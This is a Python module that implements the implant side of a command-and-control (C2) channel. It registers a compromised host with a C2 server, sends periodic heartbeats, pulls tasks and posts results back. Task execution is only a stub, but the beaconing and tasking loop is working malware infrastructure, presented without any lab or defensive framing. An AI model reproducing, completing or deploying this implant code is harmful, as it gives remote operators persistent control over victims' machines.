"""
C2 Implant Communications
Handles communication between implants and C2 server
"""
import asyncio
import json
import logging
from typing import Dict, Optional
import aiohttp

logger = logging.getLogger(__name__)


class ImplantComms:
    """Implant-side C2 communications"""
    
    def __init__(self, c2_server_url: str, api_key: str):
        self.c2_server_url = c2_server_url
        self.api_key = api_key
        self.implant_id = None
        self.running = False
    
    async def register(self, system_info: Dict) -> bool:
        """Register implant with C2 server"""
        try:
            async with aiohttp.ClientSession() as session:
                async with session.post(
                    f"{self.c2_server_url}/c2/register",
                    json=system_info
                ) as response:
                    if response.status == 200:
                        data = await response.json()
                        self.implant_id = data["data"]["implant_id"]
                        self.api_key = data["data"]["api_key"]
                        logger.info(f"Registered with C2: {self.implant_id}")
                        return True
        except Exception as e:
            logger.error(f"Registration failed: {e}")
        
        return False
    
    async def heartbeat(self, status_data: Dict) -> Optional[Dict]:
        """Send heartbeat and receive tasks"""
        try:
            async with aiohttp.ClientSession() as session:
                async with session.post(
                    f"{self.c2_server_url}/c2/heartbeat",
                    json={
                        "implant_id": self.implant_id,
                        "status_data": status_data
                    },
                    headers={"api-key": self.api_key}
                ) as response:
                    if response.status == 200:
                        data = await response.json()
                        return data["data"]
        except Exception as e:
            logger.error(f"Heartbeat failed: {e}")
        
        return None
    
    async def send_task_result(self, task_id: str, result: Dict) -> bool:
        """Send task execution result to C2"""
        try:
            async with aiohttp.ClientSession() as session:
                async with session.post(
                    f"{self.c2_server_url}/c2/implants/{self.implant_id}/tasks/{task_id}/results",
                    json={"task_id": task_id, "result": result},
                    headers={"api-key": self.api_key}
                ) as response:
                    return response.status == 200
        except Exception as e:
            logger.error(f"Failed to send task result: {e}")
        
        return False
    
    async def start(self, check_in_interval: int = 60):
        """Start C2 communications loop"""
        self.running = True
        
        while self.running:
            try:
                # Send heartbeat and get tasks
                status = {"timestamp": "now"}  # Add real status data
                response = await self.heartbeat(status)
                
                if response and response.get("tasks"):
                    for task in response["tasks"]:
                        await self._execute_task(task)
                
                await asyncio.sleep(check_in_interval)
            
            except Exception as e:
                logger.error(f"C2 loop error: {e}")
                await asyncio.sleep(check_in_interval)
    
    async def _execute_task(self, task: Dict):
        """Execute a task from C2"""
        task_id = task["task_id"]
        task_type = task["type"]
        
        logger.info(f"Executing task: {task_id} ({task_type})")
        
        try:
            result = {"status": "completed", "output": "Task executed"}
            await self.send_task_result(task_id, result)
        except Exception as e:
            result = {"status": "failed", "error": str(e)}
            await self.send_task_result(task_id, result)
    
    def stop(self):
        """Stop C2 communications"""
        self.running = False
